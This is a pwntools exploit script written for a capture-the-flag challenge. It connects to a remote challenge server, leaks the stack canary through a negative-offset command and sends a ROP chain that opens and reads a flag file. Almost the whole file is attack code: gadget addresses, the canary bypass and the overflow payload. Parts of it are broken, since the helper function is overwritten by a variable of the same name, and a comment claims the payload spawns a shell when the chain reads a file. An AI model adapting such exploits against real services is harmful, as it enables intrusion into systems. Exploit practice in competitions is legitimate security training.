from pwn import *

context.log_level = "debug"
# p = process
# p = remote("0.0.0.0",9010)
HOST = "challs.m0lecon.it"
PORT = 9010
p = remote(HOST, PORT)
elf = ELF("/home/alessio/Scrivania/tools/CTFs/M0leCon/knife/knife")


def load(offset):
    p.sendline("LOAD " + str(offset))
    return p.recv()


# leak the value of canary
canary = u64(load(-13))
print hex(canary)

# Address for the payload
pop_rdi = 0x00000000004014f3
pop_rsi_r15 = 0x00000000004014f1
ret = 0x000000000040028e
flag = 0x401518
mov_rdx = 0x0000000000401528

load = u64(load(-14))
print hex(load)

base = 0x7ffefa79d660 + 0x90

# Building the ROPchain
libc_base = 0x7f1c6f581000
libc_local = 0x7ff84f2a3000
payload = "EXIT" * 10
payload += p64(canary)
payload += "A" * 8
payload += p64(pop_rdi)
payload += p64(flag)
payload += p64(pop_rsi_r15)
payload += p64(0) * 2
payload += p64(elf.plt['open'])
payload += p64(pop_rdi)
payload += p64(3)
payload += p64(pop_rsi_r15)
payload += p64(0x602100) * 2
payload += p64(mov_rdx)
payload += p64(elf.plt['read'])
payload += p64(pop_rdi)
payload += p64(4)
payload += p64(pop_rsi_r15)
payload += p64(0x602100) * 2
payload += p64(mov_rdx)
payload += p64(0x400E7B)
# Send the payload to server to spawn a shell
p.sendline(payload)
p.interactive()
